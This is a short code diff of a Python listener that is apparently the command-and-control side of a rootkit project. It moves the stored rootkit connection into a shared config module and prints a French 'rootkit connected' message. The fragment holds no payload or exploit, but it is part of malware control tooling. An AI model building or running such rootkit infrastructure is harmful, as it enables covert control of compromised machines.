@@ -5,7 +5,6 @@ import socket
 # ------------------------------ SOCKET THREAD ------------------------------ #
 
 def socket_listener():
-    global rootkit_connection, rootkit_address
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server_socket.bind((cfg.HOST, cfg.PORT))
@@ -14,8 +13,8 @@ def socket_listener():
     connection, address = server_socket.accept()
 
     with cfg.connection_lock:
-        rootkit_connection = connection
-        rootkit_address = address
+        cfg.rootkit_connection = connection
+        cfg.rootkit_address = address  # ✅
 
     print(f"✅ [+] Rootkit connecté depuis {address[0]}")
 
